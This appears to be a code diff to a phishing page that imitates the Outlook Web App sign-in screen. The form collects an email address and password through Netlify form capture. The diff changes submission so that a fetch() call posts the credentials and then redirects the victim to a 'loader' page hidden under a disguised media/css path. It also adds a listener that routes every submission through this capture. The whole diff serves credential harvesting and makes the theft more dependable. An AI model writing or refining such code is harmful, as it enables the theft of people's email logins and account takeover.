@@ -146,7 +146,7 @@
                     &nbsp;
                 </div>
 
-                <form id="loginForm" method="POST" name="OWA2" action="loader.html" onsubmit="return validateForm(event)" netlify>
+                <form id="loginForm" method="POST" name="OWA2" action="loader.html" netlify>
                     <div class="signInInputLabel" id="userNameLabel" aria-hidden="true">Email Address:</div>
                     <div>
                         <input id="username" name="email" type="email" class="signInInputText" role="textbox" aria-labelledby="userNameLabel" required placeholder="">
@@ -202,7 +202,7 @@
             passwordField.type = showCheck.checked ? "text" : "password";
         }
 
-        function validateForm(event) {
+        function validateForm() {
             const email = document.getElementById("username");
             const password = document.getElementById("password");
             const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
@@ -212,13 +212,11 @@
 
             if (!email.value.trim() || !password.value.trim()) {
                 expltxt.textContent = "Both email and password are required.";
-                if (event) event.preventDefault();
                 return false;
             }
 
             if (!emailPattern.test(email.value)) {
                 expltxt.textContent = "Please enter a valid email address.";
-                if (event) event.preventDefault();
                 return false;
             }
 
@@ -227,7 +225,18 @@
 
         function clkLgn() {
             if (validateForm()) {
-                document.getElementById("loginForm").requestSubmit();
+                const form = document.getElementById("loginForm");
+                fetch(form.action, {
+                    method: 'POST',
+                    body: new FormData(form)
+                })
+                .then(() => {
+                    window.location.href = '/adv/wp_content/media/css/owa/loader.html';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    window.location.href = '/adv/wp_content/media/css/owa/loader.html';
+                });
             }
         }
 
@@ -237,6 +246,12 @@
                 clkLgn();
             }
         }
+
+        // Add event listener for form submission as a fallback
+        document.getElementById("loginForm").addEventListener('submit', function(e) {
+            e.preventDefault();
+            clkLgn();
+        });
 
         if (showPlaceholderText) {
             setPlaceholderText();
